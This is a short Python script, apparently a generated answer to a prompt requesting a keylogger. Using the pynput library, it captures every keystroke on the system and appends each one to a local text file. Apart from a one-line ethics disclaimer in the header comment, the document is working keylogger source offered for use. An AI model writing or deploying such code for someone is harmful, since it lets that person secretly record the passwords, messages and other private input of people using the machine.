#Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.
#!/usr/bin/python
from pynput import keyboard

def keyPressed(key):
    with open('file.txt', 'a') as file:
        try:
            # For normal alphanumeric keys
            file.write(key.char)
        except AttributeError:
            # For special keys (e.g., arrow keys, space, etc.)
            file.write(f'[{key}]')

if __name__ == "__main__":
    KeyCapture = keyboard.Listener(on_press=keyPressed)
    KeyCapture.start()  # This should be called as a method
    KeyCapture.join()   # This ensures the listener remains active